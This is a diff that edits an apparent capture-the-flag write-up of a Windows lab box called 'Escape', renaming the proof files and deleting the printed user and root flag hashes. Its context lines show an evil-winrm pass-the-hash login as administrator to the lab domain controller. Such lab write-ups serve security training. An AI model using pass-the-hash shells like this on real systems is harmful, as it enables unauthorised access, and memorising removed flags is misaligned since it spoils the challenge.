@@ -1,7 +1,7 @@
 ---
 title: Escape
 slug: Escape
-tags: [Windows, MSSQL, Responder, ESC-1, Certipy, Vulnerability Research]
+tags: [ESC-1, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -308,10 +308,9 @@ Info: Establishing connection to remote endpoint
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--ar---       10/18/2025   2:48 PM             34 user.txt
+-ar---       10/18/2025   2:48 PM             34 local-proof.txt
 
-*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
-41423f7e4726b07c7e75a0eb7b0236d5
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -515,8 +514,7 @@ $ evil-winrm -i dc.sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-ef9fe7a61f793781edbc1a953bb93a79
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat privileged-proof.txt
 ```
 
 ---
